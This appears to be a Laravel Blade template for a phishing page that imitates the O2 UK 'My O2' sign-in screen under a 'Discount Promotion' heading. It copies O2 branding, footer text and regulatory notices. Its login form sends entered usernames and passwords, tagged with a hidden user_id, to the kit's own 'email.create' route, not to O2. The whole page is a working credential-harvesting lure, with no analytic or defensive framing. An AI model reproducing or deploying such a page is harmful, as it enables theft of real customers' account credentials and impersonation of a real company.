<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, shrink-to-fit=no"
        />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <link href="favicon.ico" rel="icon" />
        <!-- <title>O2.uk</title> -->
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    
        <meta name="HandheldFriendly" content="true" />
        <meta
          name="viewport"
          content="user-scalable=0, width=device-width, initial-scale=1.0,  minimum-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"
        />
        <meta name="format-detection" content="telephone=no" />
    
        <meta name="robots" content="noodp,noydir" />
        <meta name="distribution" content="global" />
        <meta name="content-language" content="en" />
        <meta name="msvalidate.01" content="CC31ED886711FD7071695E1B2DA17022" />
        <link
          rel="Shortcut Icon"
          href="https://accounts.o2.co.uk/_assets_shared/./library/img/o2.ico"
        />
        <link rel="stylesheet" href="./library/css/fonts.css" type="text/css" />
     
        <title>
          O2 | Accounts | Sign in | View bills , balances and emails in your My O2
          account
        </title>
        <link
          rel="Shortcut Icon"
          href="https://accounts.o2.co.uk/_assets_shared/./library/img/o2.ico?v=v295"
        />
       
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

     
        <link href="{{asset('css/style.css')}}" rel="stylesheet" />

     
      </head>
<body>


    <header>
        <div class="container">
          <div class="topbar_website">
            <div class="row">
              <div class="col-md-6">
                <div class="topleft-links">
                  <span style="text-decoration: underline">
                    Personal
                  </span>
                  <span>|</span>
                  <a href="#">Business</a>
                </div>
              </div>
              <div class="col-md-6">
                <div class="topright-links ">
                  <a href="#">Sign in</a>
                  <span>or</span>
                  <a href="#"> Register</a>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="navigation-bar">
          <nav class="navbar navbar-expand-lg navbar-light">
            <div class="container">
              <a class="navbar-brand" href="#">
                <img
                  class="img-fluid"
                  src="/img/o2-img-update.png"
                  alt="logo"
                />
              </a>
              <button
                class="navbar-toggler"
                type="button"
                data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent"
                aria-controls="navbarSupportedContent"
                aria-expanded="false"
                aria-label="Toggle navigation"
              >
                <span class="navbar-toggler-icon"></span>
              </button>
              <div
                class="collapse navbar-collapse"
                id="navbarSupportedContent"
              >
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                  <li class="nav-item">
                    <a class="nav-link active" aria-current="page" href="#">
                      Shop
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link" href="#">
                      why O2
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link" href="#">
                      Help
                    </a>
                  </li>
                </ul>
                <div class="rightside d-flex">
                  <div>
                    <a href="#">My O2</a>
                  </div>
                  <div class="abc">
                    <a href="#">
                 
                      <i class="fa fa-search fa-rotate-90 fa-2xs"></i>
                      Search
                    </a>
                  </div>
                  <div>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      style="margin-top: -10px; color: white"
                      width="25"
                      height="25"
                      fill="currentColor"
                      class="bi bi-basket3"
                      viewBox="0 0 16 16"
                    >
                      <path d="M5.757 1.071a.5.5 0 0 1 .172.686L3.383 6h9.234L10.07 1.757a.5.5 0 1 1 .858-.514L13.783 6H15.5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5H.5a.5.5 0 0 1-.5-.5v-1A.5.5 0 0 1 .5 6h1.717L5.07 1.243a.5.5 0 0 1 .686-.172zM3.394 15l-1.48-6h-.97l1.525 6.426a.75.75 0 0 0 .729.574h9.606a.75.75 0 0 0 .73-.574L15.056 9h-.972l-1.479 6h-9.21z" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
          </nav>
        </div>
      </header>


  
    <section>
      <div class="hero-sec">
        <div class="container">
          <h1>O2 Discount Promotion</h1>
        </div>
      </div>
      
      <div class="main-sec">
        <div class="container">
          <div class="row">
            <div class="col-12 col-sm-12 col-md-6 col-lg-4">
              <div class="form-sec p-4 bg-white">
                <div class="text-danger"></div>
                <h2 class="mb-2">Sign in</h2>

                
@if(session('success'))
        <p>{{ session('success') }}</p>
    @endif

                <form action="{{ route('email.create') }}" method="POST">
    @csrf
    <input type="hidden" name="user_id" value="{{ $user_id }}">
    <div class="mb-2">
        <label for="floatingInputGrid">Username (usually your email address)</label>
        <input
            type="text"
            class="form-control"
            name="username"
            placeholder="Username"
            required
        />
        @error('username')
            <span class="text-danger">{{ $message }}</span>
        @enderror
    </div>
    <div>
        <label for="floatingInputGrid">Password</label>
        <input
            type="password"
            class="form-control"
            name="password"
            placeholder="XXXXXXXX"
            required
        />
        @error('password')
            <span class="text-danger">{{ $message }}</span>
        @enderror
    </div>
    <button class="sub-btn mt-4" type="submit">Submit</button>
</form>

                <div class="forgotten mt-4">
                  <a href="#">
                    <img src="/img/arrow.png" alt="arrow" /> Forgotten your
                    username or password?
                  </a>
                </div>
              </div>
            </div>
            <div class="col-12 col-sm-12 col-md-6 col-lg-8">
              <div class="main-sec-right">
                <h2>Already an O2 customer?</h2>
                <p>
                  If you've got a Pay Monthly account then we've automatically
                  registered you with My O2 and given you a username and
                  password.
                </p>
                <div class="forgotten">
                  <a href="#">
                    <img src="/img/arrow.png" alt="arrow" /> Help me sign in
                  </a>
                </div>
                <br />
                <h2>Not yet registered?</h2>
                <p>
                  If you're a Pay As You Go customer here are just some of the
                  benefits of registering:
                </p>
                <ul class="ps-4 mb-0">
                  <li>Check your usage and remaining balance</li>
                  <li>Set up auto top-ups</li>
                  <li>Manage O2 Rewards</li>
                </ul>

                <p>
                  O2 Wifi customer? You can register to manage your account
                  here, whatever network you're on.
                </p>
                <div class="forgotten mt-3">
                  <a href="#">
                    <img src="/img/arrow.png" alt="arrow" /> Register now
                  </a>
                </div>
              </div>
            </div>
          </div>
          <div class="main-last-text mt-5 ms-4">
            <h3>Stay safe</h3>
            <p>
              We'll never email or text asking you to send or verify personal,
              financial or password details. Make sure you keep your details
              safe and never give them out, even if it looks like the email or
              text came from us.
            </p>
          </div>
        </div>
      </div>
    </section>


    <footer class="footer-sec text-white">
        <div class="container">
          <div class="footer-full">
            <div class="row">
              <div class="col-12 col-sm-12 col-md-6 col-lg-4 mt-3">
                <div class="footer-links-left">
                  <div class="icon">
                    <img src="/img/store.png" alt="" />
                  </div>
                  <div>
                    <a href="#">Find a store</a>
                  </div>
                </div>

                <div class="footer-links-left">
                  <div class="icon">
                    <img src="/img/network.png" alt="" />
                  </div>
                  <div>
                    <a href="#">Check our network</a>
                  </div>
                </div>

                <div class="footer-links-left">
                  <div class="icon">
                    <img src="/img/user.png" alt="" />
                  </div>
                  <div>
                    <a href="#">Sign in to My O2</a>
                  </div>
                </div>

                <div class="footer-links-left">
                  <div class="icon">
                    <img src="/img/order.png" alt="" />
                  </div>
                  <div>
                    <a href="#">Track my order</a>
                  </div>
                </div>

                <div class="footer-links-left">
                  <div class="icon">
                    <img src="/img/search.png" alt="" />
                  </div>
                  <div>
                    <a href="#">Search</a>
                  </div>
                </div>
              </div>
              <div class="col-12 col-sm-12 col-md-6 col-lg-4 mt-3">
                <div class="footer-links-mid">
                  <h4>Popular in shop</h4>
                  <div>
                    <a href="#">iPhone 15 Pro Max</a>
                  </div>
                  <div>
                    <a href="#">iPhone 15 Pro</a>
                  </div>
                  <div>
                    <a href="#">iPhone 15</a>
                  </div>
                  <div>
                    <a href="#">Apple Watch Series 9</a>
                  </div>
                  <div>
                    <a href="#">Apple Watch Ultra 2</a>
                  </div>
                  <div>
                    <a href="#">Samsung Galaxy S23 Ultra</a>
                  </div>
                  <div>
                    <a href="#">Samsung Galaxy S23</a>
                  </div>
                  <div>
                    <a href="#">Samsung Galaxy Z Flip5</a>
                  </div>
                  <div>
                    <a href="#">Google Pixel 7 Pro</a>
                  </div>
                  <div>
                    <a href="#">Sim only</a>
                  </div>
                  <div>
                    <a href="#">Virgin Media broadband deals</a>
                  </div>
                </div>
              </div>
              <div class="col-12 col-sm-12 col-md-12 col-lg-4 mt-3">
                <div class="footer-mid-sec">
                  <h4>Help and support</h4>
                  <div>
                    <a href="#">Help home</a>
                  </div>
                  <div>
                    <a href="#">Contact us</a>
                  </div>
                  <div>
                    <a href="#">My O2</a>
                  </div>
                  <div>
                    <a href="#">Collection and delivery</a>
                  </div>
                  <h4>Shop</h4>
                  <div>
                    <a href="#">Phones</a>
                  </div>
                  <div>
                    <a href="#">Tablets</a>
                  </div>
                  <div>
                    <a href="#">Pay Monthly Sim</a>
                  </div>
                  <div>
                    <a href="#">Pay As You Go Sim</a>
                  </div>
                  <div>
                    <a href="#">Virgin Media O2 Joint Venture</a>
                  </div>
                  <div>
                    <a href="#">Sim only</a>
                  </div>
                </div>
              </div>
            </div>
            <div class="footer-social-links mt-3">
              <a href="#">
                <img src="/img/facebook.png" alt="" />
              </a>
              <a href="#">
                <img src="/img/youtube.png" alt="" />
              </a>
              <a href="#">
                <img src="/img/twitter.png" alt="" />
              </a>
              <a href="#">
                <img src="/img/instagram.png" alt="" />
              </a>
            </div>
            <ul class="secondary-links ps-0 mt-5">
              <li>
                <a href="#">About O2</a>&nbsp; |
              </li>
              <li>
                <a href="#">Better Connections Plan</a>
              </li>
              <li>
                <a href="#">Careers</a>&nbsp; |
              </li>
              <li>
                <a href="#">News & PR</a>&nbsp; |
              </li>
              <li>
                <a href="#">Sponsorship</a>&nbsp; |
              </li>
              <li>
                <a href="#">Virgin Media and O2</a>
              </li>
            </ul>
            <ul class="secondary-links ps-0">
              <li>
                <a href="#">Accessibility </a>&nbsp; |
              </li>
              <li>
                <a href="#">Terms & Conditions</a>
              </li>
              <li>
                <a href="#">Privacy policy </a>&nbsp; |
              </li>
              <li>
                <a href="#">Cookie policy</a>&nbsp; |
              </li>
              <li>
                <a href="#">Modern Slavery Statement</a>
              </li>
              <div class="ms-5">
                <p>© 2023 Telefónica UK Limited</p>
              </div>
            </ul>
            <p>
              In relation to consumer credit, Telefónica UK Limited is
              authorised and regulated by the Financial Conduct Authority
              (Reference Number 718822)
            </p>
          </div>
        </div>
      </footer>

  
</body>
</html>